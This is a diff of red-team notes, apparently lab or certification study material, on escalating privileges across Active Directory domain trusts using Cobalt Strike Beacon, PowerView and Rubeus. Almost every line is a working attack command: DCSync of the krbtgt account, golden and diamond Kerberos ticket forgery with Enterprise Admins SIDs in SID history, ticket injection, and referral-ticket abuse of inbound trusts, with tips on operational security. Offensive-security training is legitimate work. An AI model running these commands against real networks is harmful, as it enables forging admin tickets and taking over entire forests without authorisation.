@@ -109,6 +109,10 @@ beacon> dcsync dublin.contoso.com DUBLIN\krbtgt
 # Obtain domain SID for child domain
 beacon> ldapsearch (objectClass=domain) --attributes objectSid
 
+# Identify parent dc
+beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+beacon> powerpick Get-DomainController -Domain contoso.com | select -ExpandProperty Name
+
 # Obtain domain SID of parent domain
 beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com # set dn to PARENT distignuished name
 	# NOTE: Add -519 to end of SID for EA group. Use this in ticket forgery.
@@ -122,18 +126,19 @@ PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes2
     # /sids = list of SIDs you want in the ticket's SID history. Usually parent domain SID + 519 at end (Enterprise Admins group)
     /nowrap # Alternative to /outfile
 
-# ALTERNATIVE - Craft Diamond ticket (GOOD OPSEC)
+# ALTERNATIVE - Craft Diamond ticket (GOOD OPSEC) - DO AS MEDIUM INTEGRITY
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
+	512 = domain admins
+	519 = enterprise admins
 	# /tgtdeleg gets a usable TGT for the current user.
 	# /ticketuser = the user you want to impersonate.
 	# /ticketuserid = the RID of the impersonated user.
-	# /sids = a list of SIDs you want in the ticket's SID history.
+	# /sids = a list of SIDs you want in the ticket's SID history. Usually parent domain SID + 519 at end (Enterprise Admins group)
 	# /krbkey = the AES256 hash of the child domain's krbtgt account. 
 
 # Inject ticket into Beacon
 beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
-
-# Alternative (nowrap)
+# Alternative (/NOWRAP)
 beacon> make_token CONTOSO\Administrator FakePass
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...snip...]5DT00=
 
@@ -156,6 +161,7 @@ How to abuse?
 		represent security principals from external trusted domain that are allowed to become members in trusting domain
 
 Abusing One-way Inbound Trusts w/ Referral Ticket
+	in this scenario, contoso is TRUSTED and partner is TRUSTING
 ```powershell
 # Enumerate TDOs
 beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName   # trustDirection = 1
@@ -195,6 +201,9 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /s
     # /service = the target service in the trusting domain.
     # /dc = a domain controller in the trusting domain.
     # /ticket = the inter-realm TGT.
+
+# sacrificial process IMPORTANT
+beacon> make_token CONTOSO\ngreen FakePassword
 
 # Inject Service ticket into current logon session
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]
